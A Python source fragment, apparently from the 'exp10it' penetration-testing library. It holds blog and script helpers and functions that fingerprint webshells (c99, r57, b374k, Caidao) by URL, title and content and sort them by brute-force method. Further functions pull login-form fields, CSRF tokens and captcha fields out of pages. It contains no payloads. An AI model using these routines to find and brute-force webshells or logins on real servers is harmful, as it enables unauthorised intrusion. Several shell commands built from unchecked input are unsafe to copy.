    os.system("cat /tmp/1 > %s && rm /tmp/1" % file_abs_path)
    # os.system("cat %s" % file_abs_path)

    f = open(file_abs_path, "a+")
    filename = os.path.basename(file_abs_path)

    f.write("###                                                          \n")
    f.write("### name: %s" % filename + '\n')
    f.write("### function: %s" % function + '\n')
    f.write("### date: %s" % str(date) + '\n')
    f.write("### author: %s" % author + '\n')
    f.write("### blog: %s" % blog + '\n')
    f.write("#############################################################\n")
    if file_abs_path.split(".")[-1] == 'py':
        f.write(
            '''import time\nfrom exp10it import figlet2file\nfiglet2file("3xp10it",\
0,True)\ntime.sleep(1)\n\n''')
    f.close()


def insert_code_header_to_file(file_abs_path, function, date, author, blog):
    all_lines = []
    f = open(file_abs_path, "a+")
    all_lines = f.readlines()
    f.close()
    write_code_header_to_file("/tmp/2", function, date, author, blog)
    f = open("/tmp/2", "a+")
    if file_abs_path.split(".")[-1] == 'py':
        f.write(
            '''import time\nfrom exp10it import figlet2file\nfiglet2file("3xp10it",\
0,True)\ntime.sleep(1)\n\n''')
    for each in all_lines:
        f.write(each)
    f.close()
    os.system("cat /tmp/2 > %s && rm /tmp/2" % file_abs_path)
    filename = os.path.basename(file_abs_path)
    os.system(
        "sed -i 's/### name: %s/### name: %s/g' %s" %
        ('2', filename, file_abs_path))


def newscript():
    # 快速写脚本,加logo,写完后可选上传到github
    figlet2file("3xp10it", "/tmp/figletpic", True)
    time.sleep(1)
    while 1:
        print("1>write a new script")
        print("2>open and edit a exist script")
        print("your chioce:1/2 default[1]:>", end='')
        tmp = input()
        if(tmp != str(2)):
            print("please input your file_abs_path:>", end='')
            file_abs_path = input()
            if(os.path.exists(file_abs_path)):
                print(
                    "file name exists,u need to change the file name,or if you really want the name,it will \
replace the original file!!!")
                print(
                    "replace the original file? Or you want to edit(e/E for edit) the file direcly?")
                print(" y/n/e[N]:>", end=' ')
                choose = input()
                if(choose != 'y' and choose != 'Y' and choose != 'e' and choose != 'E'):
                    continue
                elif(choose == 'y' or choose == 'Y'):
                    os.system("rm %s" % file_abs_path)
                    print("please input the script function:)")
                    function = input()
                    date = datetime.date.today()
                    author = "quanyechavshuo"
                    blog = "http://3xp10it.cc"
                    if not check_file_has_logo(file_abs_path):
                        insert_code_header_to_file(
                            file_abs_path, function, date, author, blog)
                    break
            print("please input the script function:)")
            function = input()
            date = datetime.date.today()
            author = "quanyechavshuo"
            blog = "http://3xp10it.cc"
            if not check_file_has_logo(file_abs_path) and os.path.basename(
                    file_abs_path) != "newscript.py" and "exp10it.py" != os.path.basename(file_abs_path):
                insert_code_header_to_file(
                    file_abs_path, function, date, author, blog)
            break
        else:
            print("please input your file_abs_path to edit:>", end=' ')
            file_abs_path = input()
            if os.path.exists(file_abs_path) is False:
                print(
                    "file not exist,do you want to edit it and save it as a new file?[y/N] default[N]:>",
                    end=' ')
                choose = input()
                if choose == 'y' or choose == 'Y':
                    if("exp10it.py" != os.path.basename(file_abs_path)):
                        print("please input the script function:)")
                        function = input()
                        date = datetime.date.today()
                        author = "quanyechavshuo"
                        blog = "http://3xp10it.cc"

                        insert_code_header_to_file(
                            file_abs_path, function, date, author, blog)
                        break
                    else:
                        print(
                            "warning! you are edit a new file named 'exp10it',this is special,you know it's \
your python module's name,so I will exit:)")

                else:
                    continue
            else:
                if(not check_file_has_logo(file_abs_path) and "exp10it.py" != os.path.basename(file_abs_path) and "newscript.py" != os.path.basename(file_abs_path)):
                    print("please input the script function:)")

                    function = input()
                    date = datetime.date.today()
                    author = "quanyechavshuo"
                    blog = "http://3xp10it.cc"
                    insert_code_header_to_file(
                        file_abs_path, function, date, author, blog)
                    break
                else:
                    print("please input the script function:)")
                    function = input()
                    date = datetime.date.today()
                    author = "quanyechavshuo"
                    blog = "http://3xp10it.cc"
                    break

    os.system("vim %s" % file_abs_path)
    print("do you want this script upload to github server? Y/n[Y]:")
    choose = input()
    if choose != 'n':
        print("please input your remote repository name:)")
        repo_name = input()
        succeed = save2github(file_abs_path, repo_name, function)
        if(succeed):
            print("all is done and all is well!!!")
        else:
            print(
                "save2github wrong,check it,maybe your remote repository name input wrong...")


def blog():
    # 便捷写博客(jekyll+github)函数
    if platform.system() == "Windows":
        print("Sorry,current function 'def blog():' does not support windows")
        return
    if platform.system() == "Darwin":
        a = get_string_from_command("gsed")
        if re.search(r"command not found", a, re.I):
            print("Please install gnu-sed,eg.brew install gnu-sed")
    date = datetime.date.today()
    print("please input blog article title:)")
    title = input()
    print("please input blog categories:)")
    categories = input()
    print("please input blog tags,use space to separate:)")
    tags = input()
    tags_list = tags.split(' ')
    tags_write_to_file = ""
    for each in tags_list:
        tags_write_to_file += (' - ' + each + '\\\n')
    tags_write_to_file = tags_write_to_file[:-2]

    # article_title = title
    title1 = title.replace(' ', '-')
    filename = str(date) + '-' + title1 + '.md'

    file_abs_path = HOME_PATH + "/myblog/_posts/" + filename
    cmd = "cp ~/myblog/_posts/*隐藏webshell.md %s" % file_abs_path
    os.system(cmd)
    ubuntu_cmd = "sed -i 's/^title.*/title:      %s/g' %s" % (
        title, file_abs_path)
    #macos_cmd="sed -i '' 's/^title.*/title:      %s/g' %s" % (title, file_abs_path)
    macos_cmd = "gsed -i 's/^title.*/title:      %s/g' %s" % (
        title, file_abs_path)
    os.system(ubuntu_cmd) if platform.system(
    ) != "Darwin" else os.system(macos_cmd)
    ubuntu_cmd = "sed -i 's/date:       .*/date:       %s/g' %s" % (
        str(date), file_abs_path)
    #macos_cmd="sed -i '' 's/date:       .*/date:       %s/g' %s" % (str(date), file_abs_path)
    macos_cmd = "gsed -i 's/date:       .*/date:       %s/g' %s" % (
        str(date), file_abs_path)
    os.system(ubuntu_cmd) if platform.system(
    ) != "Darwin" else os.system(macos_cmd)
    ubuntu_cmd = "sed -i 's/summary:    隐藏webshell的几条建议/summary:    %s/g' %s" % (
        title, file_abs_path)
    #macos_cmd="sed -i '' 's/summary:    隐藏webshell的几条建议/summary:    %s/g' %s" % (title, file_abs_path)
    macos_cmd = "gsed -i 's/summary:    隐藏webshell的几条建议/summary:    %s/g' %s" % (
        title, file_abs_path)
    os.system(ubuntu_cmd) if platform.system(
    ) != "Darwin" else os.system(macos_cmd)
    ubuntu_cmd = "sed -i '11,$d' %s" % file_abs_path
    #macos_cmd="sed -i '' '11,$d' %s" % file_abs_path
    macos_cmd = "gsed -i '11,$d' %s" % file_abs_path
    os.system(ubuntu_cmd) if platform.system(
    ) != "Darwin" else os.system(macos_cmd)
    ubuntu_cmd = "sed -i 's/categories: web/categories: %s/g' %s" % (
        categories, file_abs_path)
    #macos_cmd="sed -i '' 's/categories: web/categories: %s/g' %s" % (categories, file_abs_path)
    macos_cmd = "gsed -i 's/categories: web/categories: %s/g' %s" % (
        categories, file_abs_path)
    os.system(ubuntu_cmd) if platform.system(
    ) != "Darwin" else os.system(macos_cmd)
    ubuntu_cmd = "sed '/ - webshell/c\\\n%s' %s > /tmp/1" % (
        tags_write_to_file, file_abs_path)
    macos_cmd = "gsed '/ - webshell/c\\\n%s' %s > /tmp/1" % (
        tags_write_to_file, file_abs_path)
    os.system(ubuntu_cmd) if platform.system(
    ) != "Darwin" else os.system(macos_cmd)
    os.system("cat /tmp/1 > %s && rm /tmp/1" % file_abs_path)
    ubuntu_cmd="vim %s" % file_abs_path
    macos_cmd="/Applications/MacVim.app/Contents/MacOS/Vim %s" % file_abs_path
    os.system(ubuntu_cmd) if platform.system(
    ) != "Darwin" else os.system(macos_cmd)

    print("do you want to update your remote 3xp10it.cc's blog?")
    print("your chioce: Y/n,default[Y]:>", end=' ')
    upa = input()
    if(upa == 'n' or upa == 'N'):
        print('done!bye:D')
    else:
        unsucceed = os.system("bash /usr/share/mytools/up.sh")
        if(unsucceed == 0):
            os.system("firefox %s" % "http://3xp10it.cc")


def get_remain_time(
        start_time,
        biaoji_time,
        remain_time,
        jiange_num,
        changing_var,
        total_num):
    # 显示完成一件事所需时间
    # start_time是开始进行时的时间变量
    # biaoji_time是用来标记每次经过jiange_num次数后的时间标记,biaoji_time是个"对当前函数全局"变量
    # remain_time是每隔jiange_num次后计算出的当前剩余完成时间
    # jiange_num是每间隔多少次计算处理速度
    # changing_var是会变化(从0到total_num)的变量
    # total_num是一件事的所有的次数
    # eg.show_remain_time(start[0],biaoji[0],temp_remain_time[0],20,current_num,230000)
    if changing_var == 1:
        biaoji_time = start_time
        return time.strftime("%Hh%Mm%Ss", time.localtime(remain_time))
    else:
        if changing_var % jiange_num == 0:
            nowtime = time.time()
            spend_time = nowtime - biaoji_time
            biaoji_time = nowtime
            speed = jiange_num / spend_time
            remain_time = (total_num - changing_var) / speed
            return time.strftime("%Hh%Mm%Ss", time.localtime(remain_time))
        else:
            return remain_time


def hunxiao(folder_path):
    # 改变md5函数,简单的cmd命令达到混淆效果,可用于上传百度网盘
    # 只适用于windows平台
    import os
    # 上面这句是因为如果其他地方单独调用这一个函数使用from exp10it import hunxiao时不能把exp10it文件开头已经
    # import的os导入,因为这样的导入方式不能导入os
    print(
        "there will be a folder named 'new' which contains the new files,but attention!!! your files those \
are going to be handled,rename them to a normal name if the file name is not regular,otherwise,the \
os.system's cmd would not find the path")
    os.chdir(folder_path)
    all_files = os.listdir(".")
    os.system("echo 111 > hunxiao.txt")
    os.system("md new")
    for each in all_files:
        if each[
                :7] != "hunxiao" and each[-2:] != "py" and os.path.isdir(each) is False:
            # cmd="c:\\windows\\system32\\cmd.exe /c copy"
            ext = each.split('.')[-1]
            # print type(each[:-(len(ext)+1)])
            new_file_name = "hunxiao_%s.%s" % (each[:-(len(ext) + 1)], ext)
            cmd = "c:\\windows\\system32\\cmd.exe /c copy %s /b + hunxiao.txt /a new\\%s.%s" % (
                each, new_file_name, ext)
            os.system(cmd)
            # print cmd
    os.system("del hunxiao.txt")


def check_string_is_ip(string):
    # 检测输入的字符串是否是ip值,如果是则返回True,不是则返回False
    p = re.compile(
        "^((?:(2[0-4]\d)|(25[0-5])|([01]?\d\d?))\.){3}(?:(2[0-4]\d)|(255[0-5])|([01]?\d\d?))$")
    if re.match(p, string):
        return True
    else:
        return False


def check_string_is_domain(string):
    # 检测输入的字符串是否是域名格式,如果是则返回True,不是则返回False
    count = 0
    if string[0] == "." or string[-1] == ".":
        return False
    for each in string:
        if each == ".":
            count += 1

    if (count == 0 and string != "localhost") or count >= 6:
        return False
    return True


def config_file_has_key_value(file, section, key_name):
    # 检测配置文件中的节点中的键有没有具体值
    # 节点中没有键或键的值为空返回False
    # 否则返回True
    has_plan_value = 0
    try:
        exist_plan = get_key_value_from_config_file(file, section, key_name)
        if exist_plan is not None and exist_plan != "":
            has_plan_value = 1
    except:
        # print("没有这项")
        pass
    if has_plan_value == 0:
        return False
    return True


def update_file_key_value(file, key_name, sep, key_value):
    # 更新文件中的关键字的值
    # key_name中没有单双引号
    # sep为=或:
    if sep not in ['=', ':']:
        print("you separator is not = or :,this function is not suitable")
        return
    else:
        if os.path.exists(file):
            # sed加-r可以直接用()等特殊字符表示regxp,否则()在表示正则中的意义时等要写成\(\)
            # sed中如果有双引号可以用#替代/,这样就没有双引号不能用的问题了,要不然sed中不能用双引号
            if isinstance(key_value, str):
                sed_string = '''sed -r -i 's#%s[^\s]+#%s"%s"#g' %s''' % (
                    key_name + sep, key_name + sep, key_value, file)
                print(sed_string)
                os.system(sed_string)
            if isinstance(key_value, int):
                sed_string = "sed -r -i 's/%s[^\s]+/%s%s/g' %s" % (
                    key_name + sep, key_name + sep, str(key_value), file)
                print(sed_string)
                os.system(sed_string)
            else:
                sed_string = "sed -r -i 's#%s[^\s]+#%s%s#g' %s" % (
                    key_name + sep, key_name + sep, str(key_value), file)
                print(sed_string)
                os.system(sed_string)
        else:
            print("file not exists")
            return


def update_config_file_key_value(file, section, key_name, key_value):
    # 通过configparser模块的调用更新配置文件
    # section是[]里面的值
    if not os.path.exists(file):
        os.system("touch %s" % file)
    import configparser
    config = configparser.ConfigParser()
    config.read(file)
    section_list = config.sections()
    if (isinstance(key_value, int) or '%' not in key_value) and not re.search(r":", key_name, re.I):
        # configparser模块的bug,无法写入'%'
        if section not in section_list:
            config.add_section(section)
        config.set(section, key_name, str(key_value))
        with open(file, 'w') as f:
            config.write(f)
    else:
        with open(file) as f:
            content = f.read()
        # 这里的section在更新cookie时section为eg.https://www.baidu.com:8000的形式
        if not re.search(r"\n*\[%s\]\n*" % section.replace(".", "\."), content, re.I):
            # 没有这个域名section
            with open(file, "a+") as f:
                f.write("[%s]\n%s = %s\n\n" % (section, key_name, key_value))
        else:
            # 有这个域名section
            # 有这个域名section且有这个key_name
            tmp = re.search(r"(\[%s\]\n+(.+\n+)*)%s[^\n\S]*=[^\n\S]*.+" %
                            (section.replace(".", "\."), key_name), content, re.I)
            if tmp:
                # 有这个域名section且有这个key_name
                pre_content = tmp.group(1)
                newcontent = re.sub(r"\[%s\]\n+(.+\n+)*%s[^\n\S]*=[^\n\S]*.+" %
                                    (section.replace(".", "\."), key_name), "%s%s = %s" % (pre_content, section, key_name, key_value), content)
                os.system("rm %s" % file)
                with open(file, "a+") as f:
                    f.write(newcontent)
            else:
                # 有这个域名section但没有这个key_name
                tmp = re.search(r"(\[%s\]\n+(.+\n+)*)(\n+)(\[.*\])?" %
                                section.replace(".", "\."), content, re.I)
                pre_content = tmp.group(1)
                input(pre_content)
                huanhang = tmp.group(3)
                input(huanhang)
                suf_content = tmp.group(4)
                input(suf_content)
                if suf_content is None:
                    suf_content = ""
                newcontent = re.sub(r"\[%s\]\n+(.+\n+)*\n+(\[.*\])?" % section.replace(".", "\."), "%s%s = %s%s%s" %
                                    (pre_content, key_name, key_value + "\n", huanhang, suf_content), content, re.I)
                input(newcontent)
                os.system("rm %s" % file)
                with open(file, "a+") as f:
                    f.write(newcontent)


def get_key_value_from_file(key, separator, file_abs_path):
    # 从文件中获取指定关键字的值,第一个参数为关键字,第二个参数为分隔符,第三个参数为文件绝对路径
    # 默认设置分隔符为":"和"="和" "和"    ",如果使用默认分隔符需要将第二个参数设置为'',也即无字符
    # 如果不使用默认分隔符,需要设置第二个参数为string类型如"="
    # 如果不存在对应的关键字则返回0
    separators = []
    if separator == '':
        separators = ['=', ':', ' ', '    ']
    else:
        separators.append(separator)

    f = open(file_abs_path, "r+")
    all = f.readlines()
    f.close()
    for each in all:
        each = re.sub(r'(\s)', "", each)
        for sep in separators:
            find1 = re.search(r"%s%s'(.*)'" % (key, sep), each)
            if find1:
                return find1.group(1)
            find2 = re.search(r'''%s%s"(.*)"''' % (key, sep), each)
            if find2:
                return find2.group(1)
            find3 = re.search(r'''%s%s([^'"]*)''' % (key, sep), each)
            if find3:
                return find3.group(1)

    return 0


def get_http_domain_pattern_from_url(url):
    # eg.从http://www.baidu.com/1/2.php中得到http://www.baidu.com的正则匹配类型
    # 也即将其中的.替换成\.
    http_domain = get_http_domain_from_url(url)
    '''
    split_string=http_domain.split(".")
    part_num=len(split_string)
    new_http_domain=""
    for i in range(part_num):
        new_http_domain+=(split_string[i]+"\.")
    new_http_domain=new_http_domain[:-2]
    return new_http_domain
    '''
    # 正则1句代码话顶6句代码
    return_value = re.sub(r'\.', '\.', http_domain)
    return return_value


def check_url_has_webshell_content(url, content, code, title):
    y1 = False
    belong2github = False
    y2 = ""

    # 过滤掉github.com里面的文件
    parsed = urlparse(url)
    pattern = re.compile(r"github.com")
    if re.search(pattern, parsed.netloc):
        belong2github = True

    # 根据url中的文件名检测url是否为webshell
    strange_filename_pattern = re.compile(
        r"^(http).*(((\d){3,})|(/c99)|((\w){10,})|([A-Za-z]{1,5}[0-9]{1,5})|([0-9]{1,5}[A-Za-z]{1,5})|(/x)|(/css)|(/licen{0,1}se(1|2){0,1}s{0,1})|(hack)|(fuck)|(h4ck)|(/diy)|(/wei)|(/2006)|(/newasp)|(/myup)|(/log)|(/404)|(/phpspy)|(/b374k)|(/80sec)|(/90sec)|(/r57)|(/b4che10r)|(X14ob-Sh3ll)|(aspxspy)|(server_sync))\.((php(3|4|5){0,1})|(phtml)|(asp)|(asa)|(cer)|(cdx)|(aspx)|(ashx)|(asmx)|(ascx)|(jsp)|(jspx)|(jspf))$",
        re.I)
    if re.match(
            strange_filename_pattern,
            url) and not belong2github and len(content) < 8000:
        y1 = True

    # 根据title检测url是否为webshell
    strange_title_pattern = re.compile(
        r".*((shell)|(b374k)|(sec)|(sh3ll)|(blood)|(r57)|(BOFF)|(spy)|(hack)|(h4ck)).*",
        re.I)
    if title is not None and code == 200:
        if re.search(
                strange_title_pattern,
                title) and not belong2github and len(content) < 8000:
            y1 = True

    if title is None and code == 200:
        # 如果title为None,说明有可能是webshell,或者是正常的配置文件
        if len(content) == 0:
            new_http_domain = get_http_domain_pattern_from_url(url)
            new_http_domain = new_http_domain[:-2]
            # print new_http_domain
            # 配置文件匹配方法
            not_webshell_pattern = re.compile(
                r"%s/(((database)|(data)|(include))/)?((config)|(conn))\.((asp)|(php)|(aspx)|(jsp))" %
                new_http_domain, re.I)
            if re.search(not_webshell_pattern, url):
                y1 = False
            else:
                y1 = True
                y2 = "direct_bao"

        caidao_jsp_pattern = re.compile(r"->\|\|<-")
        if 0 < len(content) < 50 and re.search(caidao_jsp_pattern, content):
            # jsp的菜刀一句话
            y1 = True
            y2 = "direct_bao"

    # 根据返回的html内容中是否有关键字以及返回内容大小判断是否为webshell
    strang_filecontent_pattern = re.compile(
        r".*((shell)|(hack)|(h4ck)|(b374k)|(c99)|(spy)|(80sec)|(hat)|(black)|(90sec)|(blood)|(r57)|(b4che10r)|(X14ob-Sh3ll)|(server_sync)).*",
        re.I)
    if re.search(strang_filecontent_pattern, content) and len(content) < 8000:
        y1 = True

    # 如果正常返回大小很小,说明有可能是一句话
    # 1.返回结果为200且文件内容少且有关键字的为大马
    # 2.返回结果为200且文件内容少且没有关键字的为一句话小马
    if y1 and 200 == code:
        webshell_flag = re.compile(r"(c:)|(/home)|(/var)|(/phpstudy)", re.I)
        if len(content) < 8000 and re.search(
                r'''method=('|")?post('|")?''', content):
            y2 = "biaodan_bao"
        if len(content) > 8000 and re.search(
                r'''method=('|")?post('|")?''',
                content) and re.search(
                webshell_flag,
                content):
            y2 = "bypass"

    # 如果返回码为404且返回内容大小较小但是返回结果中没有url中的文件名,判定为404伪装小马
    if 404 == code and len(content) < 600:
        url = re.sub(r"(\s)$", "", url)
        webshell_file_name = url.split("/")[-1]
        pattern = re.compile(r"%s" % webshell_file_name, re.I)
        if re.search(pattern, content):
            y1 = False
            y2 = ""
        else:
            if re.search(r'''method=('|")?post('|")?''', content) is None:
                y1 = True
                y2 = "direct_bao"
            else:
                y1 = True
                y2 = "biaodan_bao"

    return {
        'y1': y1,
        'y2': '%s' % y2,
        'y3': {
            "code": code,
            "title": title,
            "content": content}}


def check_webshell_url(url):
    # 检测url是否为webshell,并检测是webshell需要用html中搜索到的表单爆破还是用一句话类型爆破方式爆破
    # 返回结果为一个字典,有3个键值对
    # 第一个键为是否是webshell,用y1表示,y1为True或者False
    # 第二个键为webshell爆破方式,用y2表示
    # y2的值可能是
    # 1>"biaodan_bao"(根据搜到的表单爆)
    # 2>"direct_bao"(直接爆)
    # 3>""(空字符串,对应url不是webshell)
    # 4>"bypass"(对应url是一个webshll,且该webshell不用输入密码即可控制)
    # 第三个键为在http_get请求url所得的三个关键元素:code,title,content
    # y3的值是一个字典{"code":code,"title":title,"content":content}   其中code的类型为str

    y1 = False
    belong2github = False
    y2 = ""

    response_dict = get_request(url)
    code = response_dict['code']
    title = response_dict['title']
    # python3中得到的html为bytes类型,在get_request函数中已经content.decode("...")了
    content = response_dict['content']

    # 过滤掉github.com里面的文件
    parsed = urlparse(url)
    pattern = re.compile(r"github.com")
    if re.search(pattern, parsed.netloc):
        belong2github = True

    # 根据url中的文件名检测url是否为webshell
    strange_filename_pattern = re.compile(
        r"^(http).*(((\d){3,})|(/c99)|((\w){10,})|([A-Za-z]{1,5}[0-9]{1,5})|([0-9]{1,5}[A-Za-z]{1,5})|(/x)|(/css)|(/licen{0,1}se(1|2){0,1}s{0,1})|(hack)|(fuck)|(h4ck)|(/diy)|(/wei)|(/2006)|(/newasp)|(/myup)|(/log)|(/404)|(/phpspy)|(/b374k)|(/80sec)|(/90sec)|(/r57)|(/b4che10r)|(X14ob-Sh3ll)|(aspxspy)|(server_sync))\.((php(3|4|5){0,1})|(phtml)|(asp)|(asa)|(cer)|(cdx)|(aspx)|(ashx)|(asmx)|(ascx)|(jsp)|(jspx)|(jspf))$",
        re.I)
    if re.match(
            strange_filename_pattern,
            url) and not belong2github and len(content) < 8000:
        y1 = True

    # 根据title检测url是否为webshell
    strange_title_pattern = re.compile(
        r".*((shell)|(b374k)|(sec)|(sh3ll)|(blood)|(r57)|(BOFF)|(spy)|(hack)|(h4ck)).*",
        re.I)
    if title is not None and code == 200:
        if re.search(
                strange_title_pattern,
                title) and not belong2github and len(content) < 8000:
            y1 = True

    if title is None and code == 200:
        # 如果title为None,说明有可能是webshell,或者是正常的配置文件
        if len(content) == 0:
            new_http_domain = get_http_domain_pattern_from_url(url)
            new_http_domain = new_http_domain[:-2]
            # print new_http_domain
            # 配置文件匹配方法
            not_webshell_pattern = re.compile(
                r"%s/(((database)|(data)|(include))/)?((config)|(conn))\.((asp)|(php)|(aspx)|(jsp))" %
                new_http_domain, re.I)
            if re.search(not_webshell_pattern, url):
                y1 = False
            else:
                y1 = True
                y2 = "direct_bao"

        caidao_jsp_pattern = re.compile(r"->\|\|<-")
        if 0 < len(content) < 50 and re.search(caidao_jsp_pattern, content):
            # jsp的菜刀一句话
            y1 = True
            y2 = "direct_bao"

    # 根据返回的html内容中是否有关键字以及返回内容大小判断是否为webshell
    strang_filecontent_pattern = re.compile(
        r".*((shell)|(hack)|(h4ck)|(b374k)|(c99)|(spy)|(80sec)|(hat)|(black)|(90sec)|(blood)|(r57)|(b4che10r)|(X14ob-Sh3ll)|(server_sync)).*",
        re.I)
    if re.search(strang_filecontent_pattern, content) and len(content) < 8000:
        y1 = True

    # 如果正常返回大小很小,说明有可能是一句话
    # 1.返回结果为200且文件内容少且有关键字的为大马
    # 2.返回结果为200且文件内容少且没有关键字的为一句话小马
    if y1 and 200 == code:
        webshell_flag = re.compile(r"(c:)|(/home)|(/var)|(/phpstudy)", re.I)
        if len(content) < 8000 and re.search(
                r'''method=('|")?post('|")?''', content):
            y2 = "biaodan_bao"
        if len(content) > 8000 and re.search(
                r'''method=('|")?post('|")?''',
                content) and re.search(
                webshell_flag,
                content):
            y2 = "bypass"

    # 如果返回码为404且返回内容大小较小但是返回结果中没有url中的文件名,判定为404伪装小马
    if 404 == code and len(content) < 600:
        url = re.sub(r"(\s)$", "", url)
        webshell_file_name = url.split("/")[-1]
        pattern = re.compile(r"%s" % webshell_file_name, re.I)
        if re.search(pattern, content):
            y1 = False
            y2 = ""
        else:
            if re.search(r'''method=('|")?post('|")?''', content) is None:
                y1 = True
                y2 = "direct_bao"
            else:
                y1 = True
                y2 = "biaodan_bao"

    return {
        'y1': y1,
        'y2': '%s' % y2,
        'y3': {
            "code": code,
            "title": title,
            "content": content}}


def get_webshell_suffix_type(url):
    # 获取url所在的webshell的真实后缀类型,结果为asp|php|aspx|jsp
    url = re.sub(r'(\s)$', "", url)
    parsed = urlparse(url)
    len1 = len(parsed.scheme)
    len2 = len(parsed.netloc)
    main_len = len1 + len2 + 3
    len3 = len(url) - main_len
    url = url[-len3:]

    # php pattern
    pattern = re.compile(r"\.((php)|(phtml)).*", re.I)
    if re.search(pattern, url):
        return "php"

    # asp pattern
    pattern1 = re.compile(r"\.asp.*", re.I)
    pattern2 = re.compile(r"\.aspx.*", re.I)
    if re.search(pattern1, url):
        if re.search(pattern2, url):
            return "aspx"
        else:
            return "asp"
    pattern = re.compile(r"\.((asa)|(cer)|(cdx)).*", re.I)
    if re.search(pattern, url):
        return "asp"

    # aspx pattern
    pattern = re.compile(r"\.((aspx)|(ashx)|(asmx)|(ascx)).*", re.I)
    if re.search(pattern, url):
        return "aspx"

    # jsp pattern
    pattern = re.compile(r"\.((jsp)|(jspx)|(jspf)).*", re.I)
    if re.search(pattern, url):
        return "jsp"


def get_http_domain_from_url(url):
    # eg.http://www.baidu.com/1/2/3.jsp==>http://www.baidu.com
    parsed = urlparse(url)
    http_domain_value = parsed.scheme + "://" + parsed.hostname
    # print http_domain_value
    return http_domain_value


def get_http_netloc_from_url(url):
    # eg.http://www.baidu.com:8080/1/2/3.jsp==>http://www.baidu.com:8080
    # eg.http://www.baidu.com:80/1/2/3.jsp==>http://www.baidu.com
    parsed = urlparse(url)
    http_netloc_value = parsed.scheme + "://" + parsed.netloc
    return http_netloc_value


def get_user_and_pass_form_from_html(html):
    # 从html内容(管理员登录的html)中获取所有的form表单
    # 返回结果为一个字典,包含3个键值对
    #"user_form_name":"" 没有则相应返回值为"None",不是返回""(空字符串)
    #"pass_form_name":"" 没有则相应返回值为"None",不是返回""(空字符串)
    #"form_action_url":"" 没有则相应返回值为"None",不是返回""(空字符串)
    html = re.sub(r"<!--.*-->", "", html)
    user_form_name = None
    pass_form_name = None
    form_action_url = None
    all_input_pattern = re.compile(
        r'''(.*<input .*>)''',
        re.I)

    all_input_line = re.findall(all_input_pattern, html)

    index = -1
    has_pass_form = False
    user_form_line = None
    pass_form_line = None
    for each in all_input_line:
        index += 1
        if re.search(r'''<input .*type=('|")?password.*>''', each):
            user_form_line = all_input_line[index - 1]
            if "hidden" in user_form_line:
                user_form_line=all_input_line[index-2]
                pass_form_line = each
                has_pass_form = True

    user_pattern = re.compile(r'''name=('|")?([^'" ]{,20})('|")?''', re.I)
    pass_pattern = re.compile(r'''name=('|")?([^'" ]{,20})('|")?''', re.I)

    if index >= 1 and user_form_line is not None and pass_form_line is not None:
        # 既有user表单也有pass表单,标准的管理登录页面
        user_form_name = re.search(user_pattern, user_form_line).group(2)
        pass_form_name = re.search(pass_pattern, pass_form_line).group(2)

    elif has_pass_form and index == 0:
        # 只有pass表单,eg.大马webshell页面
        tmp = re.search(pass_pattern, pass_form_line)
        if tmp is not None and tmp.group(2) is not None:
            pass_form_name = tmp.group(2)

    # 下面找form_action_url表单
    form_action_url_pattern = re.compile(
        r'''form.*action=('|")?([^'"\s]{,100})('|")?.*>[\s\S]{,1000}?(<input .*type=('|")?password.*>)''', re.I)
    find_form_action_url = re.search(form_action_url_pattern, html)
    if find_form_action_url and find_form_action_url.group(2) is not None:
        form_action_url = find_form_action_url.group(2)

    return_value = {
        'user_form_name': user_form_name,
        'pass_form_name': pass_form_name,
        'form_action_url': form_action_url}
    # print return_value
    return return_value



def get_url_has_csrf_token(url, cookie=""):
    # test if url has csrf token
    # return a dict
    # return dict['has_csrf_token']=True for has
    # return dict['has_csrf_token']=False for has not
    # return dict['csrf_token_name']="csrf token param name value" or ""
    return_value = {'has_csrf_token': False, 'csrf_token_name': ''}
    if "^" in url:
        url = url.split("^")[0]
    elif "?" in url:
        url = url.split("?")[0]
    a = get_request(url, by="selenium_phantom_js", cookie=cookie)
    has_csrf_token = False
    csrf_token_name = ""
    if a['has_form_action']:
        first_csrf_token = re.search(
            r"([^&?\^]*token[^=]*)=([^&]+)", a['form_action_value'], re.I)
        if first_csrf_token:
            first_csrf_token_value = first_csrf_token.group(2)
            b = get_request(url, by="selenium_phantom_js")
            if b['has_form_action']:
                second_csrf_token_value = re.search(
                    r"([^&?\^]*token[^=]*)=([^&]+)", b['form_action_value'], re.I).group(2)
                if second_csrf_token_value != first_csrf_token_value:
                    has_csrf_token = True
                    csrf_token_name = first_csrf_token.group(1)

    return_value['has_csrf_token'] = has_csrf_token
    return_value['csrf_token_name'] = csrf_token_name
    return return_value


def get_user_and_pass_form_from_url(url):
    # 从url的get请求中获取所有form表单
    # 返回结果为一个字典,包含3个键值对
    #"user_form_name":"" 没有则相应返回值为None,不是返回""(空字符串)
    #"pass_form_name":"" 没有则相应返回值为None,不是返回""(空字符串)
    #"response_key_value":value 这个value的值是一个字典,也即get_request函数的返回结果
    # 之所以要每次在有访问url结果的函数里面返回url访问结果,这样是为了可以只访问一次url,这样就可以一直将访问的返\
    # 回结果传递下去,不用多访问,效率更高
    url = re.sub(r'(\s)$', '', url)
    response_key_value = get_request(url, by="selenium_phantom_js")
    content = response_key_value['content']
    return_value = get_user_and_pass_form_from_html(content)
    return_value['response_key_value'] = response_key_value
    # print return_value
    return return_value


def get_yanzhengma_form_and_src_from_url(url):
    # 得到url对应的html中的验证码的表单名和验证码src地址
    parsed = urlparse(url)
    content = get_request(url, by="selenium_phantom_js")['content']
    # sub useless html content
    content = re.sub(r"<!--.+-->", "", content)
    yanzhengma_form_name = None
    yanzhengma_src = None
    user_pass_pattern = re.compile(
        r'''<input .*name=('|")?([^'"]{,7}user[^'"]{,7}).*>[\s\S]{,500}<input .*name=('|")?([^'"]{,7}pass[^'"]{,7}).*>([\s\S]*)''',
        re.I)
    find_user_pass_form = re.search(user_pass_pattern, content)
    if find_user_pass_form and find_user_pass_form.group(2) is not None \
            and find_user_pass_form.group(4) is not None:
        # user和pass表单之后剩下的内容
        content_left = find_user_pass_form.group(5)
        yanzhengma_pattern = re.compile(
            r'''<input .*name=('|")?([^'" ]{,20})('|")?.*>''', re.I)
        yanzhengma_src_pattern = re.compile(
            r'''<img .*src=('|")?([^'" ]{,80})('|")?.*>''', re.I)
        find_yanzhengma = re.search(yanzhengma_pattern, content_left)
        find_yanzhengma_src = re.search(yanzhengma_src_pattern, content_left)
        if find_yanzhengma and find_yanzhengma_src:
            # 目前认为只有同时出现验证码和验证码src的html才是有验证码的,否则如"记住登录"的选项会被误认为是验证码
            yanzhengma_form_name = find_yanzhengma.group(2)
            # print yanzhengma_form_name
            if find_yanzhengma_src:
                yanzhengma_src = find_yanzhengma_src.group(2)
                # print yanzhengma_src
